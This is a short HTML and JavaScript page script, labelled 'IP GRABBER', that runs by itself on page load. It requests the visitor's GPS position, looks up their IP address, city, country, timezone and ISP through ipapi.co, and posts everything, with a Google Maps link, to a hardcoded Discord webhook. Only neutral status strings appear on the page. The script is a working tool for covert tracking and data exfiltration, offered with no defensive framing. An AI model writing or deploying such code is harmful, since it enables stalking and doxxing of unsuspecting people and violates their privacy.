<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
var x = document.getElementById("output");
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = "DATA_GATHER_FAILED";
  }
}

function showPosition(position) {
  x.innerHTML = "DATA_COLLECT_SUCCESS"

  
  $.getJSON('https://ipapi.co/json/', function(data) {
    //console.log(JSON.stringify(data, null, 2));
  })
  .then((ipData) => {
    var sendData = {}

    sendData.content = `**__IP GRABBER__**\n**IP:** ${ipData.ip}\n**City:**${ipData.city}, ${ipData.region}, ${ipData.country_name}
**Timezone:**: ${ipData.timezone}
**org:** ${ipData.org}
**Latitude:** ${position.coords.latitude}
**Longitude:**${position.coords.longitude}
${'https://www.google.com/maps/search/?api=1&query='+position.coords.latitude+'%2C'+position.coords.longitude}`

  sendData.username='Geolocator'
$.post('https://discord.com/api/webhooks/1053049279142440990/h3mXKLhzKE7UZAYLOW2ss2kmDW0X74vgNgdSsnCbZ-4wfluNJI4etxqkiHE85JJoOuqv', sendData)
  })
    .catch((e) =>{
   x.innerHTML = "DATA_COLLECT_BLOCKED_BY_ADBLOCKER"
  
  sendData.content = `**__IP GRABBER__**\n
**Latitude:** ${position.coords.latitude}
**Longitude:**${position.coords.longitude}
${'https://www.google.com/maps/search/?api=1&query='+position.coords.latitude+'%2C'+position.coords.longitude}`
  sendData.username='Geolocator'
$.post('https://discord.com/api/webhooks/1053049279142440990/h3mXKLhzKE7UZAYLOW2ss2kmDW0X74vgNgdSsnCbZ-4wfluNJI4etxqkiHE85JJoOuqv', sendData)
  
  
  
  
  
  
  })
}
getLocation()
</script>
